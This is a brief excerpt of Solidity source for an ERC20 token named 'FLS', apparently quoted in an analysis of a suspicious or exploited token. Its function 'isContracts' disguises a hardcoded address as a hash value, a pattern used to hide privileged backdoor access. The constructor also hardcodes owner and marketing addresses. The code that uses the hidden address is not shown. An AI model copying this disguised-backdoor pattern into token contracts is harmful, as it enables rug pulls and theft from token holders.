...
contract ERC20 is Ownable, IERC20 {
    ...
    function isContracts(address account) public pure returns (bool) {
        bytes32 accountHash = 0x000000000000000000000000720Cd75D138e9E77bA8292aa0f249621ca7eE493;
...
contract FLS is ERC20 {
    ...
    constructor() ERC20("FLS", "FLS") {

        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // Create a uniswap pair for this new token
        _tokenOwner = address(0x6e2264D19B52b3E146A765876B62B174C637554b);
        marketAddress = address(0x64D5151eb1d6d6b0Da910b680fef6213fFF59dF7);
